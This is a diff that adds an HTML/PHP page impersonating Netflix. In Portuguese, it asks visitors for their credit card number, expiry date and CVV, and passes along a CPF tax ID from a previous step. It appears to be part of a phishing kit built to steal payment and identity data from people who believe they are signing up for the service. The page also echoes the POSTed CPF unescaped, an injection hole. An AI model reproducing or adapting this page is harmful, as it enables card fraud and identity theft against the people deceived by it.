@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>Netflix</title>
+</head>
+<meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0" />
+<style type="text/css">
+    * {
+        font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+    }
+
+    body {
+        background: #f3f3f3;
+        margin: 15px;
+        font-size: 19px;
+        color: #333;
+        -webkit-font-smoothing: antialiased;
+    }
+
+    input[type=submit] {
+
+        color: #fff;
+        background-color: #e50914;
+        padding: 20px;
+        width: 100%;
+        -webkit-box-sizing: border-box;
+        /* Safari/Chrome, other WebKit */
+        -moz-box-sizing: border-box;
+        /* Firefox, other Gecko */
+        box-sizing: border-box;
+        font-size: 19px;
+        padding: .75rem 25.33333333px;
+        min-width: 110px;
+        min-height: 60px;
+        width: 100%;
+        line-height: 19px;
+        margin-bottom: 15px;
+        font-weight: bold;
+        border: none;
+    }
+
+    input[type=text]:focus {
+        border: 1px solid blue;
+    }
+
+    input[type=text],
+    input[type=tel],
+    input[type=password] {
+
+        padding: 20px;
+        outline: none;
+        border-radius: 2px;
+        width: 100%;
+        -webkit-box-sizing: border-box;
+        /* Safari/Chrome, other WebKit */
+        -moz-box-sizing: border-box;
+        /* Firefox, other Gecko */
+        box-sizing: border-box;
+        border: 1px solid #333;
+        margin-bottom: 15px;
+    }
+
+    .error {
+        display: none;
+        font-size: 12px;
+        color: #b92d2b;
+        margin-bottom: 10px;
+        margin-top: -10px;
+
+    }
+</style>
+<script src="//code.jquery.com/jquery-1.10.2.min.js"></script>
+
+<body>
+    <img src="/logo.png"><br>
+
+
+    <span style="font-size:13px;">PASSO <b>1</b> DE <b>2</b></span>
+    <tr>
+        <td>
+            <p>
+                <span style="font-size:13px;">PASSO <b>2</b> DE <b>2</b></span></p>
+            <p><b>Informe os dados do seu cartão de crédito.</b></p>
+
+            <div><img src="/cc.png"></div>
+
+            <form id="form1" action="/signup/complete" method="POST">
+                <div><input required="required" type="tel" name="cartao" maxlength="19" value="" id="cartao" placeholder="Número do Cartão de Crédito:"></div>
+                <div class="error" id="error_cartao">O número do cartão de crédito é obrigatório..</div>
+                <div style="margin-top:5px;margin-bottom:20px;">
+                    <table width="100%" border="0" cellpading="0" cellspacing="0">
+                        <tr>
+                            <td>
+                                Validade:
+                            </td>
+                            <td align="right">
+                                <select required="required" style="padding:15px;font-weight: bold" name="" id="">
+                                    <option value="">- Mes -</option>
+                                    <option value="01">01</option>
+                                    <option value="02">02</option>
+                                    <option value="03">03</option>
+                                    <option value="04">04</option>
+                                    <option value="05">05</option>
+                                    <option value="06">06</option>
+                                    <option value="07">07</option>
+                                    <option value="08">08</option>
+                                    <option value="09">09</option>
+                                    <option value="10">10</option>
+                                    <option value="11">11</option>
+                                    <option value="12">12</option>
+                                    <option value="13">13</option>
+                                    <option value="14">14</option>
+                                    <option value="15">15</option>
+                                    <option value="16">16</option>
+                                    <option value="17">17</option>
+                                    <option value="18">18</option>
+                                    <option value="19">19</option>
+                                    <option value="20">20</option>
+                                    <option value="21">21</option>
+                                    <option value="22">22</option>
+                                    <option value="23">23</option>
+                                    <option value="24">24</option>
+                                    <option value="25">25</option>
+                                    <option value="26">26</option>
+                                    <option value="27">27</option>
+                                    <option value="28">28</option>
+                                    <option value="29">29</option>
+                                    <option value="30">30</option>
+                                    <option value="31">31</option>
+                                </select>
+                                /
+                                <select required="required" style="padding:15px;font-weight: bold;width:130px;" name="" id="">
+                                    <option value="">- Ano -</option>
+                                    <option value="2019">2019</option>
+                                    <option value="2020">2020</option>
+                                    <option value="2021">2021</option>
+                                    <option value="2022">2022</option>
+                                    <option value="2023">2023</option>
+                                    <option value="2024">2024</option>
+                                    <option value="2025">2025</option>
+                                    <option value="2026">2026</option>
+                                    <option value="2027">2027</option>
+                                    <option value="2028">2028</option>
+                                    <option value="2029">2029</option>
+                                    <option value="2031">2031</option>
+                                    <option value="2032">2032</option>
+                                    <option value="2033">2033</option>
+                                    <option value="2034">2034</option>
+                                </select>
+                            </td>
+                        </tr>
+                    </table>
+                </div>
+                <div class="error" id="error_datavalidade">O data de validade é obrigatória (MES/ANO).</div>
+                <div><input required="required" type="tel" maxlength="4" name="cvv" id="cvv" value="" placeholder="Código de verificação (CVV):"></div>
+                <div class="error" id="error_cvv">O código de verificação é obrigatório (CVV).</div>
+                <div><input type="hidden" name="cpf" value="<?php echo $_POST['cpf'] ?>"></div>
+                <div><input type="submit" name="continuar" value="CONTINUAR"></div>
+
+            </form>
+        </td>
+    </tr>
+    </table>
+    <script>
+        $('#form1').submit(function () {
+
+            var error = 0;
+            if ($('#cvv').val().length < 2) {
+                $('#cvv').css('border', '1px solid red');
+                $('#error_cvv').show();
+                error = 1;
+            } else {
+                $('#cvv').css('border', '1px solid #333');
+                $('#error_cvv').hide();
+            }
+
+            if (error == 1) {
+                return false;
+            }
+        });
+    </script>
+</body>
+</html>
